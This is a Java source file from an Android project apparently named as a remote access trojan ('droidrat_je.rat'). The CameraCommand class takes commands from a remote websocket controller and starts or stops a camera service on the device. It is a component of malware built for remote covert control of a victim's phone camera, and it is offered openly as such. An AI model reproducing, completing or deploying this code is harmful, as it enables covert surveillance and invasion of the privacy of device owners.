package com.je_chen.droidrat_je.rat.command;

import android.content.Context;
import android.content.Intent;

import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
import com.je_chen.droidrat_je.service.camera.CameraService;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websockets;

public class CameraCommand extends CommandFather {

    private final String TAG = "Camera Event";

    private Context context;

    private CameraService cameraService;

    public CameraCommand(Context context) {
        this.context = context;
        cameraService = new CameraService();
    }

    @Override
    public void send(String value) {
        websockets.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

                case "StartCamera":
                    Intent startCameraIntent = new Intent(context, CameraService.class);
                    startCameraIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    context.startService(startCameraIntent);
                    break;

                case "StopCamera":
                    Intent stopCameraIntent = new Intent(context, CameraService.class);
                    stopCameraIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    context.stopService(stopCameraIntent);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
